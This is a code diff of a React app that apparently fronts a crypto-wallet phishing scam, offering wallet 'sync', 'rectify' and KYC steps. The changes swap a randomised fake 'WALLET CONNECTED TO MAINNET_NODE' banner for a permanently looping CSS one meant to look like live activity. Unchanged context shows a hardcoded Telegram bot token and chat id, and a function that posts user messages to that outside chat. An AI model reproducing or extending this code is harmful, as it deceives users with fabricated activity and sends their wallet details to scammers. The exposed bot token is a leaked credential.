@@ -17,7 +17,6 @@ export default function App() {
   const [kycPhase, setKycPhase] = useState(1); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
-  const [feedMsg, setFeedMsg] = useState(""); 
 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
@@ -34,28 +33,6 @@ export default function App() {
       body: JSON.stringify({ chat_id: chatId, text: msg })
     }).catch(() => {});
   };
-
-  // --- INDEPENDENT CONNECTION FEED ENGINE ---
-  useEffect(() => {
-    const generateMsg = () => {
-      const hex = "0123456789abcdef";
-      let r = "";
-      for (let i = 0; i < 4; i++) r += hex[Math.floor(Math.random() * 16)];
-      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
-      
-      // Keep visible for 4 seconds
-      setTimeout(() => {
-        setFeedMsg("");
-      }, 4000);
-    };
-
-    // Start immediately
-    generateMsg();
-    // Loop every 10 seconds exactly
-    const timer = setInterval(generateMsg, 10000);
-    
-    return () => clearInterval(timer);
-  }, []);
 
   const handleHandshake = () => {
     if (activeTask !== "Rectify" && (!inputVal || inputVal === "0")) return;
@@ -86,14 +63,22 @@ export default function App() {
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
+      {/* CSS INFINITE LOOP - Bypasses Browser Sleep */}
       <style>{`
-        @keyframes slide {
-          0% { opacity: 0; transform: translateY(20px); }
-          10% { opacity: 1; transform: translateY(0); }
+        @keyframes notifyLoop {
+          0%, 85% { opacity: 0; transform: translateY(20px); }
           90% { opacity: 1; transform: translateY(0); }
+          95% { opacity: 1; transform: translateY(0); }
           100% { opacity: 0; transform: translateY(-20px); }
         }
-        .feed-item { animation: slide 4s ease-in-out forwards; }
+        .auto-feed {
+          position: fixed; bottom: 30px; left: 15px; right: 15px;
+          background: rgba(16,185,129,0.15); border: 1px solid #10b981;
+          color: #10b981; padding: 15px; border-radius: 15px;
+          font-size: 10px; text-align: center; font-weight: 900;
+          z-index: 9999; pointer-events: none;
+          animation: notifyLoop 10s infinite;
+        }
       `}</style>
 
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
@@ -184,13 +169,9 @@ export default function App() {
         </div>
       )}
 
-      {/* INDEPENDENT OVERLAY FOR FEED */}
-      <div style={{position:'fixed', bottom:'25px', left:'15px', right:'15px', zIndex:9999, pointerEvents:'none'}}>
-        {feedMsg && (
-          <div key={feedMsg} className="feed-item" style={{backgroundColor:'rgba(16,185,129,0.15)', border:'1px solid #10b981', color:'#10b981', padding:'15px', borderRadius:'15px', fontSize:'11px', textAlign:'center', fontWeight:'900'}}>
-            {feedMsg}
-          </div>
-        )}
+      {/* THE UNSTOPPABLE CSS FEED */}
+      <div className="auto-feed">
+        🛡️ 0x7b2f...91e4 WALLET CONNECTED TO MAINNET_NODE
       </div>
     </div>
   );
